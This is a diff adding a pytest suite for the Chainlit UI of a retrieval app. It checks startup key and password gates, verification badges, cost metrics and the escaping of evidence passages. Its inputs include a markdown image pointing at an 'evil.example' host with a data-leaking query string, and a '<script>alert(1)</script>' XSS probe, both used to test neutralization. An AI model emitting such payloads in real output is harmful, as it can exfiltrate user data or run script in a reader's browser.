@@ -1,0 +1,275 @@
+"""UI rendering contracts that do not need a running Chainlit server.
+Skipped when the ui extra is not installed (a plain `uv sync` clone)."""
+import importlib
+import os
+import subprocess
+import sys
+import tempfile
+from pathlib import Path
+
+import pytest
+
+pytest.importorskip("chainlit")
+REPO = Path(__file__).resolve().parents[1]
+
+# Everything ui.py or config reads at import time (same idea as test_local_llm):
+# a subprocess test must not inherit the developer's shell or their .env.
+UNSET = ("OPENROUTER_API_KEY", "OPENROUTER_ENV_FILE", "ORCHESTRATOR_MODEL", "OPENROUTER_BASE_URL",
+         "LLM_BACKEND", "EMBED_BACKEND", "OLLAMA_LLM_MODEL", "OLLAMA_URL", "OLLAMA_EMBED_MODEL",
+         "OPENROUTER_EMBED_MODEL", "LIBRARY_DB_PATH", "ASK_LANG", "AYL_STRICT_HIT_ID",
+         "AYL_ALLOW_START_WITHOUT_KEY", "AYL_ALLOW_DEFAULT_LOGIN", "AYL_CHAINLIT_DIR",
+         "CHAINLIT_AUTH_SECRET", "CHAINLIT_PASSWORD", "LANGCHAIN_TRACING_V2")
+
+
+def _run(code: str, check=True, **env) -> subprocess.CompletedProcess:
+    """Run `code` in a fresh interpreter that can import `ui`, with every config
+    input unset and then `env` applied, in a fresh empty directory (load_dotenv
+    reads the cwd). check=True: an import-time SystemExit fails the test."""
+    base = {k: v for k, v in os.environ.items() if k not in UNSET}
+    base["PYTHONPATH"] = str(REPO)
+    with tempfile.TemporaryDirectory() as fresh:
+        return subprocess.run([sys.executable, "-c", code], capture_output=True, text=True,
+                              check=check, env={**base, **env}, cwd=fresh)
+
+
+@pytest.fixture(autouse=True)
+def hosted_backend(monkeypatch):
+    """ui.py's startup gate asks preflight, which read the backend from the
+    environment once, at import time: a developer whose shell (or .env) says
+    LLM_BACKEND=ollama would otherwise test a server whose key gate is off.
+    Every test here describes the default backend, except the local-mode one,
+    which pins it the other way."""
+    monkeypatch.setattr("ask_your_library.preflight.OPENROUTER_NEEDS_KEY", True)
+
+
+@pytest.fixture
+def ui(monkeypatch, tmp_path):
+    # ui.py refuses the placeholder password unless the demo login is acknowledged,
+    # refuses to start without an OpenRouter key, mints a secret file on import and
+    # creates the chat db: all of that goes to tmp, never to the repo's .chainlit/.
+    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
+    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
+    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
+    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
+    sys.modules.pop("ui", None)
+    monkeypatch.syspath_prepend(str(REPO))
+    module = importlib.import_module("ui")
+    monkeypatch.setattr(module.cl, "run_sync", lambda value: value)
+    return module
+
+
+def test_reflect_step_shows_the_real_stop_reason(ui, monkeypatch):
+    shown = []
+    monkeypatch.setattr(ui, "show_step", lambda name, text: shown.append((name, text)))
+    ui.render_event("reflect", {"current_query": "", "stop_reason": "step limit (5) — wanted to keep searching"})
+    assert shown[-1][0] == "reflect" and "step limit" in shown[-1][1]
+    ui.render_event("reflect", {"current_query": ""})
+    assert "enough" in shown[-1][1]                     # legacy fallback when no reason is given
+    ui.render_event("reflect", {"current_query": "more whales"})
+    assert "more whales" in shown[-1][1]
+
+
+def test_badge_is_green_only_when_nothing_is_broken_or_unattributed(ui):
+    def badge(**numbers):
+        return ui.verification_badge({"verification": "v", "provenance": numbers})
+
+    assert ui.GREEN in badge(checked=3, confirmed=3, broken=0, unattributed=0)
+    assert ui.YELLOW in badge(checked=3, confirmed=2, broken=0, unattributed=1)
+    assert ui.YELLOW in badge(checked=3, confirmed=2, broken=1, unattributed=0, broken_items=[])
+    assert ui.GRAY in badge(checked=0, confirmed=0, broken=0, unattributed=0)
+
+
+def test_ui_import_writes_only_into_its_configured_dir(ui, tmp_path):
+    assert (tmp_path / "chainlit" / "chat.db").exists()
+    assert ui.CHAINLIT_DIR == tmp_path / "chainlit"
+
+
+def test_markdown_images_are_neutralized_but_links_survive(ui):
+    text = "See ![pixel](https://evil.example/p?d=leak) and [the book](https://example.org/x)"
+    out = ui.neutralize_markdown(text)
+    assert "evil.example" not in out and "[image removed]" in out and "example.org" in out
+    ref = "see ![pixel][x] here\n\n[x]: https://evil.example/p?d=leak"
+    out = ui.neutralize_markdown(ref)
+    assert "![" not in out and "[pixel][x]" in out          # demoted to a link, never an image
+    assert "![" not in ui.neutralize_markdown("![a ![b](u)](v)")
+
+
+def test_empty_password_refuses_to_start(monkeypatch, tmp_path):
+    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
+    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
+    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
+    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
+    monkeypatch.setenv("CHAINLIT_PASSWORD", "")
+    monkeypatch.syspath_prepend(str(REPO))
+    sys.modules.pop("ui", None)
+    with pytest.raises(SystemExit):
+        importlib.import_module("ui")
+    sys.modules.pop("ui", None)
+
+
+def test_missing_key_refuses_to_start_before_anyone_logs_in(monkeypatch, tmp_path):
+    """The preflight in on_chat_start only speaks to a user who is already
+    logged in; a keyless server must refuse at startup instead."""
+    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
+    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
+    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
+    monkeypatch.delenv("AYL_ALLOW_START_WITHOUT_KEY", raising=False)
+    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
+    monkeypatch.delenv("OPENROUTER_ENV_FILE", raising=False)
+    # config.OPENROUTER_ENV_FILE was resolved at import time; the key lookup must
+    # find nothing whatever the developer running the tests has configured.
+    monkeypatch.setattr("ask_your_library.embeddings.OPENROUTER_ENV_FILE", None)
+    monkeypatch.syspath_prepend(str(REPO))
+    sys.modules.pop("ui", None)
+    with pytest.raises(SystemExit) as exit_info:
+        importlib.import_module("ui")
+    sys.modules.pop("ui", None)
+    message = str(exit_info.value)
+    assert "OPENROUTER_API_KEY" in message and "AYL_ALLOW_START_WITHOUT_KEY" in message
+
+    # ...and the escape hatch really is the only thing standing in the way.
+    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
+    sys.modules.pop("ui", None)
+    assert importlib.import_module("ui").CHAINLIT_DIR == tmp_path / "chainlit"
+    sys.modules.pop("ui", None)
+
+
+def test_the_fully_local_mode_starts_with_no_key_at_all(tmp_path):
+    """The mirror of the test above: LLM_BACKEND=ollama with local embeddings
+    needs no OpenRouter account, so the same keyless server must come up —
+    without the escape hatch, which is for importing ui.py, not for serving.
+
+    Driven by the environment in a subprocess, not by pinning the derived
+    OPENROUTER_NEEDS_KEY: config resolves the backends once, at import time, so
+    pinning the flag would test the gate against a value this test wrote itself
+    and would survive config deciding the local mode needs a key after all."""
+    chainlit_dir = tmp_path / "chainlit"
+    code = "import ui; print(ui.CHAINLIT_DIR)"
+    # No key of any kind, and no AYL_ALLOW_START_WITHOUT_KEY: the backends alone
+    # must carry the import past the gate. check=True => a SystemExit fails here.
+    done = _run(code, LLM_BACKEND="ollama", EMBED_BACKEND="ollama",
+                CHAINLIT_AUTH_SECRET="test-secret", AYL_ALLOW_DEFAULT_LOGIN="1",
+                AYL_CHAINLIT_DIR=str(chainlit_dir))
+    assert done.stdout.strip() == str(chainlit_dir)
+
+
+def test_a_key_from_the_env_file_alone_starts_the_server(monkeypatch, tmp_path, capsys):
+    """The startup gate must accept the documented OPENROUTER_ENV_FILE route,
+    not only an exported variable — and read that file once, without ever
+    putting the key on screen."""
+    key_file = tmp_path / "openrouter.env"
+    secret = "test-key-value-0123456789"     # neutral: the snapshot guard rejects real key prefixes
+    key_file.write_text(f'OPENROUTER_API_KEY="{secret}"\n')
+
+    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
+    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
+    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
+    # No escape hatch and no exported key: the env file is the only way through.
+    monkeypatch.delenv("AYL_ALLOW_START_WITHOUT_KEY", raising=False)
+    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
+    # config resolved OPENROUTER_ENV_FILE at import time, so point the lookup
+    # at the tmp file the way the running process would have it.
+    monkeypatch.setattr("ask_your_library.embeddings.OPENROUTER_ENV_FILE", key_file)
+
+    reads = []
+    real_read_text = Path.read_text
+
+    def counting_read_text(self, *args, **kwargs):
+        if self == key_file:
+            reads.append(self)
+        return real_read_text(self, *args, **kwargs)
+    monkeypatch.setattr(Path, "read_text", counting_read_text)
+
+    monkeypatch.syspath_prepend(str(REPO))
+    sys.modules.pop("ui", None)
+    try:
+        module = importlib.import_module("ui")      # no SystemExit: the gate is satisfied
+        assert module.CHAINLIT_DIR == tmp_path / "chainlit"
+    finally:
+        sys.modules.pop("ui", None)
+
+    assert len(reads) == 1, f"the key file was read {len(reads)} times, expected once"
+    captured = capsys.readouterr()
+    assert secret not in captured.out and secret not in captured.err
+
+def test_partial_metrics_are_shown_but_not_added_to_the_session_cost(ui, monkeypatch):
+    """A run paused at a clarify reports its cost so far; the final event covers
+    the whole run, so only that one accumulates."""
+    import asyncio
+
+    store = {}
+    monkeypatch.setattr(ui.cl, "user_session", type("S", (), {"get": staticmethod(lambda k: store.get(k)),
+                                                             "set": staticmethod(lambda k, v: store.__setitem__(k, v))})())
+    sent = []
+
+    class Msg:
+        def __init__(self, content, **kw):
+            sent.append(content)
+        async def send(self):
+            return None
+    monkeypatch.setattr(ui.cl, "Message", Msg)
+    base = {"model": "m", "llm_calls": 3, "input_tokens": 10, "output_tokens": 2, "cache_read_tokens": 0,
+            "by_role": {}, "hits_seen": 0, "evidence_distilled": 0, "redacted_lines": 0, "evidence_dropped_no_hit": 0}
+    asyncio.run(ui.show_metrics({**base, "cost_usd": 0.01, "seconds": 5, "steps_taken": 1, "partial": True}))
+    assert store.get("session_cost") in (None, 0.0) and "so far" in sent[-1]
+    asyncio.run(ui.show_metrics({**base, "cost_usd": 0.03, "seconds": 9, "steps_taken": 2, "stop_reason": "enough"}))
+    assert abs(store["session_cost"] - 0.03) < 1e-9 and "so far" not in sent[-1]
+
+
+def test_plan_step_says_when_the_planner_fell_back_to_the_raw_question(ui, monkeypatch):
+    from ask_your_library.i18n import t
+    shown = []
+    monkeypatch.setattr(ui, "show_step", lambda name, text: shown.append((name, text)))
+    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": []})
+    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": [], "plan_fallback": True})
+    assert t("ui_plan_fallback") not in shown[0][1] and t("ui_plan_fallback") in shown[1][1]
+
+
+def test_every_evidence_item_opens_on_the_passage_it_was_checked_against(ui, monkeypatch):
+    """After the badge, one <details> per retrieved passage: book, section, hit id
+    and verdict counts in the summary; every quote with its verdict inside, then the
+    passage from the act events. Corpus text is escaped, image-free and carries no
+    raw line break (a blank line would end the HTML block and spill the passage
+    into the chat as markdown); a passage the run never showed says so."""
+    from ask_your_library.i18n import t
+    sent = []
+
+    class Msg:
+        def __init__(self, content, **kw):
+            sent.append(content)
+        async def send(self):
+            return None
+    monkeypatch.setattr(ui.cl, "Message", Msg)
+    monkeypatch.setattr(ui, "show_step", lambda name, text: None)
+    view = ui.RunView()
+    passage = "## Plot\n\nCall me Ishmael. <script>alert(1)</script>\n\n- **Ahab** ![x](http://evil/x.png)"
+    ui.render_event("act", {"steps_taken": 1, "hits": [], "hits_log": [{"hit_id": "s1h1", "text": passage}]}, view=view)
+    ui.render_event("validate", {"verification": "OK", "provenance": {
+        "checked": 3, "confirmed": 1, "unattributed": 0, "broken": 2, "unused": 0, "broken_items": [],
+        "items": [{"hit_id": "s1h1", "book": "Moby Dick — Herman Melville", "section": "Chapter 1",
+                   "quote": "Call me Ishmael.", "status": "confirmed"},
+                  {"hit_id": "s1h1", "book": "Moby Dick — Herman Melville", "section": "Chapter 1",
+                   "quote": "Ishmael was a lawyer.", "status": "broken"},
+                  {"hit_id": "s9h9", "book": "B — A", "section": "s", "quote": "gone", "status": "broken"}]}}, view=view)
+    assert len(sent) == 2                                    # the badge, then the evidence list
+    block = sent[1]
+    assert block.count("<details>") == 2                      # two passages for three items
+    assert t("ui_evidence_title", n=3, p=2) in block
+    assert f"{t('ev_status_confirmed')} 1" in block and f"{t('ev_status_broken')} 1" in block   # per-passage counts
+    assert "<code>s1h1</code>" in block and "<q>Call me Ishmael.</q>" in block and "<q>Ishmael was a lawyer.</q>" in block
+    assert "&lt;script&gt;" in block and "<script>" not in block and "![x]" not in block
+    assert "\n" not in block and "<br><br>" in block          # no blank line can end the HTML block
+    assert "## Plot" in block                                 # the heading text survives, as text
+    assert t("ui_passage_missing") in block                  # s9h9 was never in this run
+    # views are per question and do not mix: a second view has no passages
+    other = ui.RunView()
+    ui.render_event("validate", {"verification": "OK", "provenance": {"items": [
+        {"hit_id": "s1h1", "book": "b", "section": "s", "quote": "q", "status": "confirmed"}]}}, view=other)
+    assert t("ui_passage_missing") in sent[-1] and "Call me Ishmael" not in sent[-1]
+
+
+def test_badge_broken_quotes_are_neutralized_and_single_line(ui):
+    badge = ui.verification_badge({"verification": "x", "provenance": {
+        "checked": 1, "confirmed": 0, "unattributed": 0, "broken": 1, "unused": 0,
+        "broken_items": [{"hit_id": "s1h1", "book": "B", "section": "s", "quote": "line one\n\n![x](http://evil/x.png)"}]}})
+    assert "line one<br><br>[image removed]" in badge and "![x]" not in badge
